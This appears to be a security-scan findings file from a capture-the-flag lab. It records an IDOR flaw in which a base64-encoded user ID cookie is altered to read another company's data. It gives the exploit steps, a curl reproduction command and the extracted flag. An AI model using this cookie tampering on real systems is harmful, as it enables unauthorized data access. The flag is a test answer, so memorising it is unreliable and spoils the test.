@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:18:42.643057+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "463ad15b-b157-41bb-8334-10912c302ee7",
+      "timestamp": "2026-04-12T21:18:42.642935+00:00",
+      "title": "IDOR via Base64-Encoded User ID Cookie - Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:49433/company/2/jobs",
+      "description": "The application stores the authenticated user's company ID in a cookie named 'access_token' as a Bearer token where the token value is simply the user ID base64-encoded (e.g., MQ== = 1, Mg== = 2). An attacker can modify this cookie to access any other company's data without authorization.\n\nExploit steps:\n1. Login as demo/demo \u2014 receives cookie: access_token=\"Bearer MQ==\" (base64(1))\n2. Change cookie to access_token=\"Bearer Mg==\" (base64(2)) to impersonate company 2\n3. Access /company/2/jobs \u2014 returns company 2's confidential job listings including the flag",
+      "evidence": "GET /company/2/jobs with Cookie: access_token=\"Bearer Mg==\" returns HTTP 200 with body containing:\n<p>secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}</p>\n\nFLAG: flag{0d8ca439-1cc2-4de9-a83f-08182aede041}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s 'http://172.17.0.1:49433/company/2/jobs' -H 'Cookie: access_token=\"Bearer Mg==\"'",
+        "expected": "HTTP 200 with flag{0d8ca439-1cc2-4de9-a83f-08182aede041} in response body"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "d7ead799-494e-47c5-b332-623d5f96168e",
+      "timestamp": "2026-04-12T21:18:50.934132+00:00",
+      "title": "CTF App Architecture - IDOR Vulnerability",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Login[\"/token POST - Login\"]\n  Login --> Cookie[\"Set-Cookie: access_token=Bearer base64(userID)\"]\n  Cookie --> Jobs[\"/company/{id}/jobs - View Jobs\"]\n  Cookie --> Profile[\"/edit_profile/{id} - Edit Profile\"]\n  Jobs --> IDOR[\"IDOR: Change cookie base64(1) to base64(2)\"]\n  IDOR --> FlagData[\"Company 2 Jobs - Contains FLAG\"]\n  FlagData --> Flag[\"flag{0d8ca439-1cc2-4de9-a83f-08182aede041}\"]"
+    }
+  ]
+}
